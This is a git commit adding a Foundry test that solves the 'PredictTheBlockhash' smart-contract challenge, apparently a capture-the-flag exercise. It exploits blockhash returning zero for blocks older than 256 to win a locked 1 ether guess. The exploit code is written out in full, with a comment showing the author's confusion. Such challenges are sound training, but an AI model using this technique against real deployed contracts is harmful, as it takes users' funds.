de6395e9795bc8275c90493e482f0992583a3aea
Surbhi Audichya <audichyasurbhi@gmail.com>
2024-04-08 21:49:15 +0530

    feat: Add exploit solution for PredictTheBlockhash  challenge

--- PredictTheBlockhash/test/PredictTheBlockhash.t.sol
+++ PredictTheBlockhash/test/PredictTheBlockhash.t.sol
@@ -16,6 +16,9 @@ contract PredictTheBlockhashTest is Test {
         exploitContract = new ExploitContract(predictTheBlockhash);
     }
 
+    // In this challenge, the vulnerability lies in the PredictTheBlockhash contract.
+    // hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
+    // We need to just wait for 256 blocks before calling settle which will result in 0x hash.
     function testExploit() public {
         // Set block number
         uint256 blockNumber = block.number;
@@ -24,10 +27,16 @@ contract PredictTheBlockhashTest is Test {
         vm.roll(blockNumber + 10);
 
         // Put your solution here
-        bytes32 guess = blockhash(block.number + 1);
+        // hash of the given block when blocknumber is one of the 256 most recent blocks; otherwise returns zero
+        bytes32 guess = blockhash(block.number); // 0x
+        console.logBytes32(guess);
         predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
-        vm.roll(block.number + 2);
+        vm.roll(block.number + 258); // settle will check for settlementBlockNumber which was set as blockNumber of lockInGuess tx +1
+        bytes32 expectedHash = (blockhash(block.number - 1));
+        console.logBytes32(expectedHash);
+        //assertEq(expectedHash, guess); // why expectedHash (0x10c) != guess  (0x) but in settle function it is 0x
         predictTheBlockhash.settle();
+
         _checkSolved();
     }
 
